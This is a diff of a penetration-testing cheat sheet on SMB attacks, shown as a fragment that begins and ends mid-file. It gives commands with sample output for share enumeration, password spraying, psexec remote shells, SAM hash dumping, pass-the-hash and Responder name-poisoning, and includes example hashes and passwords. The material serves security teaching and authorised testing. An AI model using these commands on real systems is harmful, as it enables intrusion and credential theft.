-* **NetBIOS/RPC enumeration** to gather intel or perform actions.
+- **Misconfigurations/excessive privileges**
+- **Known or new vulnerabilities**
+- **Sensitive shared files**
+- **NetBIOS/RPC enumeration** to gather intel or perform actions.
 
 </details>
 
@@ -744,39 +926,53 @@ When scanning, SMB on **port 445** indicates direct TCP usage, while **port 139*
 
 **Example Command**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo nmap <TARGET_IP> -sV -sC -p139,445
 ```
-```bash
-# PORT    STATE SERVICE     VERSION
-# 139/tcp open  netbios-ssn Samba smbd 4.6.2
-# 445/tcp open  netbios-ssn Samba smbd 4.6.2
-# MAC Address: 00:00:00:00:00:00 (VMware)
 
-# Host script results:
-# |_nbstat: NetBIOS name: RTH, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-# | smb2-security-mode: 
-# |   2.02: 
-# |_    Message signing enabled but not required
-# | smb2-time: 
-# |   date: 2021-09-19T13:16:04
-# |_  start_date: N/A
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+MAC Address: 00:00:00:00:00:00 (VMware)
+
+Host script results:
+|_nbstat: NetBIOS name: RTH, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-09-19T13:16:04
+|_  start_date: N/A
 ```
 
-| Flag            | Purpose                                         |
-|-----------------|-------------------------------------------------|
-| `-sC`           | Run default NSE scripts (includes `ftp-anon`)   |
-| `-sV`           | Detect service version and banner               |
-| `-p 21`         | Scan only TCP port 21                           |
-| `<TARGET_IP>` | Target IP address                               |
+</td></tr>
+</table>
+
+| Flag          | Purpose                                       |
+| ------------- | --------------------------------------------- |
+| `-sC`         | Run default NSE scripts (includes `ftp-anon`) |
+| `-sV`         | Detect service version and banner             |
+| `-p 21`       | Scan only TCP port 21                         |
+| `<TARGET_IP>` | Target IP address                             |
 
 **Why This Matters**
-* Identifies SMB version and implementation (e.g., Samba smbd 4.6.2)
-* Reveals hostname and possible OS type
-* Helps detect:
-    * Misconfigurations (e.g., message signing disabled)
-    * Potential vulnerabilities
-* Provides NetBIOS details for further enumeration
+
+- Identifies SMB version and implementation (e.g., Samba smbd 4.6.2)
+- Reveals hostname and possible OS type
+- Helps detect:
+  - Misconfigurations (e.g., message signing disabled)
+  - Potential vulnerabilities
+- Provides NetBIOS details for further enumeration
 
 </details>
 
@@ -790,16 +986,16 @@ SMB can be configured not to require authentication, which is often called a nul
 
 SMB servers can allow access without requiring a username and password (null session), or we may use valid credentials if available.
 
-* **Potential Access:** Using anonymous authentication, we can gather information such as:
-    * List of file shares
-    * Usernames and groups
-    * Permissions and policies
-    * Running services
-* **Tools Supporting Null Sessions:**
-    * `smbclient`
-    * `smbmap`
-    * `rpcclient`
-    * `enum4linux`
+- **Potential Access:** Using anonymous authentication, we can gather information such as:
+  - List of file shares
+  - Usernames and groups
+  - Permissions and policies
+  - Running services
+- **Tools Supporting Null Sessions:**
+  - `smbclient`
+  - `smbmap`
+  - `rpcclient`
+  - `enum4linux`
 
 </details>
 
@@ -808,79 +1004,143 @@ SMB servers can allow access without requiring a username and password (null ses
 
 **Using `smbclient`**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 smbclient -N -L //<TARGET_IP>
 ```
-```bash
-# Sharename       Type      Comment
-# -------         --        -------
-# ADMIN$          Disk      Remote Admin
-# C$              Disk      Default share
-# notes           Disk      CheckIT
-# IPC$            IPC       IPC Service (DEVSM)
-# SMB1 disabled no workgroup available
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+Sharename       Type      Comment
+-------         --        -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+notes           Disk      CheckIT
+IPC$            IPC       IPC Service (DEVSM)
+SMB1 disabled no workgroup available
+```
+
+</td></tr>
+</table>
 
 ---
 
 **Using `smbmap`**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 smbmap -H <TARGET_IP>
 ```
-```bash
-# [+] IP: <TARGET_IP>:445
-# Disk       Permissions   Comment
-# ----       -----------   -------
-# ADMIN$     NO ACCESS     Remote Admin
-# C$         NO ACCESS     Default share
-# IPC$       READ ONLY     IPC Service (DEVSM)
-# notes      READ, WRITE   CheckIT
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+[+] IP: <TARGET_IP>:445
+Disk       Permissions   Comment
+----       -----------   -------
+ADMIN$     NO ACCESS     Remote Admin
+C$         NO ACCESS     Default share
+IPC$       READ ONLY     IPC Service (DEVSM)
+notes      READ, WRITE   CheckIT
 ```
 
+</td></tr>
+</table>
+
 **Browse Share Recursively:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 smbmap -H <TARGET_IP> -r <SHARE_NAME>
 ```
-```bash
-# [+] Guest session       IP: <TARGET_IP>:445    Name: <TARGET_IP>                           
-#         Disk                                                    Permissions     Comment
-#         --                                                   ---------    -------
-#         notes                                                   READ, WRITE
-#         .\notes\*
-#         dr--r--r               0 Mon Nov  2 00:57:44 2020    .
-#         dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
-#         dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
-#         fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
-#         fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
-#         dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
-#         dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
-#         dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+[+] Guest session       IP: <TARGET_IP>:445    Name: <TARGET_IP>
+        Disk                                                    Permissions     Comment
+        --                                                   ---------    -------
+        notes                                                   READ, WRITE
+        .\notes\*
+        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
+        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
+        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
+        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
+        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
+        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
+        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
+        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
+```
+
+</td></tr>
+</table>
 
 From the above example, the permissions are set to READ and WRITE, which one can use to upload and download the files.
 
-
 **Download a file:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 smbmap -H <TARGET_IP> --download "notes\note.txt"
 ```
-```bash
-# [+] Starting download: notes\note.txt (116 bytes)
-# [+] File output to: /rth/<TARGET_IP>-notes_note.txt
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+[+] Starting download: notes\note.txt (116 bytes)
+[+] File output to: /rth/<TARGET_IP>-notes_note.txt
 ```
 
+</td></tr>
+</table>
+
 **Upload a file:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 smbmap -H <TARGET_IP> --upload ./test.txt "notes\test.txt"
 ```
-```bash
-# [+] Starting upload: test.txt (20 bytes)
-# [+] Upload complete.
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+[+] Starting upload: test.txt (20 bytes)
+[+] Upload complete.
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -891,56 +1151,82 @@ RPC can be enumerated using a **null session** with `rpcclient` or automated too
 
 **Using `rpcclient`**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 rpcclient -U'%' <TARGET_IP>
 ```
-```bash
-rpcclient $> enumdomusers
 
-# user:[mhope] rid:[0x641]
-# user:[svc-ata] rid:[0xa2b]
-# user:[svc-bexec] rid:[0xa2c]
-# user:[roleary] rid:[0xa36]
-# user:[smorgan] rid:[0xa37]
-```
+</td></tr>
+<tr><td colspan="2">
 
 ---
 
-**Using `rpcclient`**
+```
+rpcclient $> enumdomusers
+
+user:[mhope] rid:[0x641]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+```
+
+</td></tr>
+</table>
+
+---
+
+**Using `enum4linux-ng`**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 ./enum4linux-ng.py <TARGET_IP> -A -C
 ```
-```bash
-# ENUM4LINUX - next generation
 
-# ...
+</td></tr>
+<tr><td colspan="2">
 
-#  ====================================
-# |    Service Scan on <TARGET_IP>     |
-#  ====================================
-# ...
-# [*] Checking SMB (timeout: 5s)
-# [*] SMB is accessible on 445/tcp
-# [*] Checking SMB over NetBIOS (timeout: 5s)
-# [*] SMB over NetBIOS is accessible on 139/tcp
+---
 
-#  ===================================================                            
-# |    NetBIOS Names and Workgroup for <TARGET_IP>    |
-#  ===================================================                                                                                         
-# [*] Got domain/workgroup name: WORKGROUP
-# [*] Full NetBIOS names information:
-# - WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
-# - WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
-# - WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
-# - MAC Address = 00-0C-29-D7-17-DB
-# ...
-#  ========================================
-# |    SMB Dialect Check on <TARGET_IP>    |
-#  ========================================
-
-# ...
 ```
+ENUM4LINUX - next generation
+
+...
+
+ ====================================
+|    Service Scan on <TARGET_IP>     |
+ ====================================
+...
+[*] Checking SMB (timeout: 5s)
+[*] SMB is accessible on 445/tcp
+[*] Checking SMB over NetBIOS (timeout: 5s)
+[*] SMB over NetBIOS is accessible on 139/tcp
+
+ ===================================================
+|    NetBIOS Names and Workgroup for <TARGET_IP>    |
+ ===================================================
+[*] Got domain/workgroup name: WORKGROUP
+[*] Full NetBIOS names information:
+- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
+- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
+- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
+- MAC Address = 00-0C-29-D7-17-DB
+...
+ ========================================
+|    SMB Dialect Check on <TARGET_IP>    |
+ ========================================
+
+...
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -955,33 +1241,48 @@ If a null session is not enabled, we will need credentials to interact with the 
 <summary><h3>Brute Forcing and Password Spray</h3></summary>
 
 **Brute-Forcing**
-* Attempts as many passwords as possible against a single account.
-* Risk: May trigger account lockout if threshold is exceeded.
-* Recommendation: Only use if the lockout threshold is known; otherwise, avoid.
+
+- Attempts as many passwords as possible against a single account.
+- Risk: May trigger account lockout if threshold is exceeded.
+- Recommendation: Only use if the lockout threshold is known; otherwise, avoid.
 
 **Password Spraying**
-* Targets multiple usernames with a single common password.
-* Safer approach to avoid account lockouts.
-* Guidelines:
-    * Use 2–3 password attempts per user if lockout threshold is unknown.
-    * Wait 30–60 minutes between attempts.
+
+- Targets multiple usernames with a single common password.
+- Safer approach to avoid account lockouts.
+- Guidelines:
+  - Use 2–3 password attempts per user if lockout threshold is unknown.
+  - Wait 30–60 minutes between attempts.
 
 **Using `CrackMapExec` for Password Spraying**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER_LIST> -p '<PASSWORD>' --local-auth
 ```
-```bash
-# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\Administrator:<PASSWORD> STATUS_LOGON_FAILURE 
-# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\admin:<PASSWORD> STATUS_LOGON_FAILURE 
-# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\fsmith:<PASSWORD> STATUS_LOGON_FAILURE 
-# SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\tcrash:<PASSWORD> STATUS_LOGON_FAILURE 
 
-# ...
+</td></tr>
+<tr><td colspan="2">
 
-# SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\jurena:<PASSWORD> (Pwn3d!) 
+---
+
 ```
+SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\Administrator:<PASSWORD> STATUS_LOGON_FAILURE
+SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\admin:<PASSWORD> STATUS_LOGON_FAILURE
+SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\fsmith:<PASSWORD> STATUS_LOGON_FAILURE
+SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\tcrash:<PASSWORD> STATUS_LOGON_FAILURE
+
+...
+
+SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\jurena:<PASSWORD> (Pwn3d!)
+```
+
+</td></tr>
+</table>
 
 > **Note:** By default `CrackMapExec` will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`.
 
@@ -994,25 +1295,38 @@ To use impacket-psexec, we need to provide the domain/username, the password, an
 
 **Option 1 > Connect to a remote machine using `impacket-psexec`**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 impacket-psexec <USER>:'<PASSWORD>'@<TARGET_IP>
 ```
-```bash
-# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
-# [*] Requesting shares on <TARGET_IP>.....
-# [*] Found writable share ADMIN$
-# [*] Uploading file EHtJXgng.exe
-# [*] Opening SVCManager on <TARGET_IP>.....
-# [*] Creating service nbAc on <TARGET_IP>.....
-# [*] Starting service nbAc.....
-# [!] Press help for extra shell commands
-# Microsoft Windows [Version 10.0.19041.1415]
-# (c) Microsoft Corporation. All rights reserved.
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on <TARGET_IP>.....
+[*] Found writable share ADMIN$
+[*] Uploading file EHtJXgng.exe
+[*] Opening SVCManager on <TARGET_IP>.....
+[*] Creating service nbAc on <TARGET_IP>.....
+[*] Starting service nbAc.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19041.1415]
+(c) Microsoft Corporation. All rights reserved.
 
 
 C:\Windows\system32>
 ```
+
+</td></tr>
+</table>
 
 > **NOTE:** The same options apply to `impacket-smbexec` and `impacket-atexec`.
 
@@ -1020,15 +1334,28 @@ C:\Windows\system32>
 
 **Option 2 > Run CMD or PowerShell commands using `crackmapexec`**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
 ```
-```bash
-# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
-# SMB         <TARGET_IP> 445    WIN7BOX  [+] .\<USER>:<PASSWORD> (Pwn3d!)
-# SMB         <TARGET_IP> 445    WIN7BOX  [+] Executed command via smbexec
-# SMB         <TARGET_IP> 445    WIN7BOX  nt authority\system
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
+SMB         <TARGET_IP> 445    WIN7BOX  [+] .\<USER>:<PASSWORD> (Pwn3d!)
+SMB         <TARGET_IP> 445    WIN7BOX  [+] Executed command via smbexec
+SMB         <TARGET_IP> 445    WIN7BOX  nt authority\system
+```
+
+</td></tr>
+</table>
 
 > **Note:** If the `--exec-method` is not defined, CrackMapExec will try to execute the `atexec` method, if it fails you can try to specify the `--exec-method` smbexec.
 
@@ -1041,20 +1368,33 @@ Imagine we are in a network with multiple machines. Some of them share the same 
 
 **Example Command**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 crackmapexec smb 10.10.110.0/24 -u <USER> -p '<PASSWORD>' --local-auth --logged-on-users
 ```
-```bash
-# SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-# SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
-# SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
-# SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
-# SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
-# SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
-# SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
-# SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
-# SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
+SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
+SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
+SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
+SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
+SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1063,27 +1403,40 @@ crackmapexec smb 10.10.110.0/24 -u <USER> -p '<PASSWORD>' --local-auth --logged-
 
 The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
 
-* Authenticate as another user
-* Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts
-* Pass The Hash
+- Authenticate as another user
+- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts
+- Pass The Hash
 
 **Example Command**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam
 ```
-```bash
-# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-# SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
-# SMB         <TARGET_IP> 445    WIN7BOX  [+] Dumping SAM hashes
-# SMB         <TARGET_IP> 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-# SMB         <TARGET_IP> 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# SMB         <TARGET_IP> 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# SMB         <TARGET_IP> 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
-# SMB         <TARGET_IP> 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
-# SMB         <TARGET_IP> 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
-# SMB         <TARGET_IP> 445    WIN7BOX  [+] Added 6 SAM hashes to the database
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
+SMB         <TARGET_IP> 445    WIN7BOX  [+] Dumping SAM hashes
+SMB         <TARGET_IP> 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         <TARGET_IP> 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         <TARGET_IP> 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         <TARGET_IP> 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
+SMB         <TARGET_IP> 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+SMB         <TARGET_IP> 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
+SMB         <TARGET_IP> 445    WIN7BOX  [+] Added 6 SAM hashes to the database
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1094,13 +1447,26 @@ If we manage to get an **NTLM hash** of a user, and if we cannot crack it, we ca
 
 **Example Command**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
 ```
-```bash
-# SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-# SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\<USER>:<NTLM_HASH> (Pwn3d!)
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\<USER>:<NTLM_HASH> (Pwn3d!)
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1110,20 +1476,21 @@ crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
 SMB can be abused to capture users' **NetNTLM v1/v2 hashes**. By setting up a fake SMB server, we can trick clients into authenticating to it.
 
 **Tool: Responder**
-* Responder is a **LLMNR, NBT-NS, and MDNS poisoner**.
-* Key capabilities include:
-    * Setting up **fake services** (e.g., SMB) to capture credentials.
-    * Listening for **LLMNR and NBT-NS traffic**.
-    * Responding on behalf of servers that victims try to reach.
-    * Capturing **NetNTLM v1/v2 hashes** automatically.
+
+- Responder is a **LLMNR, NBT-NS, and MDNS poisoner**.
+- Key capabilities include:
+  - Setting up **fake services** (e.g., SMB) to capture credentials.
+  - Listening for **LLMNR and NBT-NS traffic**.
+  - Responding on behalf of servers that victims try to reach.
+  - Capturing **NetNTLM v1/v2 hashes** automatically.
 
 **Workflow**
+
 1. Start Responder in a network segment.
 2. Wait for LLMNR/NBT-NS requests from clients.
 3. Responder responds with the fake SMB service.
 4. Victim attempts authentication to the fake SMB server.
 5. NetNTLM hashes are captured for offline cracking or relay attacks.
-
 
 ```mermaid
 flowchart TD
@@ -1132,20 +1499,20 @@ flowchart TD
     B["<b>Responder</b><br/>Fake SMB Server"]
     C["<b>Attacker Captures</b><br/>NetNTLM hash"]
     D["<b>Offline Cracking</b><br/>or<br/><b>Relay Attacks</b>"]
-    
+
     %% Connections
     A -->|"<b>1.</b> Sends LLMNR or<br/>NBT-NS request"| B
     B -->|"<b>2.</b> Responds as<br/>target SMB server"| A
     A -->|"<b>3.</b> Authenticates using<br/>NetNTLM hash"| B
     B -->|"<b>4.</b> Hash captured"| C
     C -->|"<b>5.</b> Next step"| D
-    
+
     %% Styling
     style A fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
     style B fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style C fill:#3d5a40,stroke:#9ACD32,stroke-width:3px,color:#fff
     style D fill:#5a4a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#ffcc00,stroke-width:3px
     linkStyle 1 stroke:#ff6b6b,stroke-width:3px
@@ -1155,8 +1522,9 @@ flowchart TD
 ```
 
 **Why This Matters**
-* Allows attackers to harvest authentication credentials without user interaction.
-* Can be combined with **hash cracking** or **SMB relay attacks**.
+
+- Allows attackers to harvest authentication credentials without user interaction.
+- Can be combined with **hash cracking** or **SMB relay attacks**.
 
 When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:
 
@@ -1170,7 +1538,7 @@ flowchart TD
     E["<b>Send Multicast Query</b><br/>LLMNR/NBT-NS"]
     F["<b>❌ Host Not Found</b>"]
     Z["<b>✓ Use IP Address</b>"]
-    
+
     %% Connections
     A -->|"<b>1.</b> Start resolution"| B
     B -->|"<b>Record Found</b>"| Z
@@ -1182,7 +1550,7 @@ flowchart TD
     D -->|"<b>Server Unreachable</b>"| E
     E -->|"<b>Response Received</b>"| Z
     E -->|"<b>No Response</b>"| F
-    
+
     %% Styling
     style A fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
     style B fill:#3d5a40,stroke:#9ACD32,stroke-width:3px,color:#fff
@@ -1191,7 +1559,7 @@ flowchart TD
     style E fill:#8b6a3a,stroke:#ffcc00,stroke-width:3px,color:#fff
     style F fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style Z fill:#2a6a4a,stroke:#32cd32,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#6c8ebf,stroke-width:2px
     linkStyle 1 stroke:#32cd32,stroke-width:3px
@@ -1207,41 +1575,62 @@ flowchart TD
 
 **Step 1: Create a fake SMB server using the Responder default configuration:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo responder -I ens3
 ```
-```bash
-#   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-#   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-#   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-#                    |__|
 
-#            NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+</td></tr>
+<tr><td colspan="2">
 
-#   To support this project:
-#   Patreon -> https://www.patreon.com/PythonResponder
-#   Paypal  -> https://paypal.me/PythonResponder
+---
 
-#   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
-#   To kill this script hit CTRL-C
-
-# ...
-
-
-# [+] Listening for events...
-
-# ...
 ```
-```bash
-# [*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Domain Master Browser)
-# [*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Browser Election)
-# [*] [MDNS] Poisoned answer sent to <TARGET_IP>   for name mysharefoder.local
-# [*] [LLMNR]  Poisoned answer sent to <TARGET_IP> for name mysharefoder
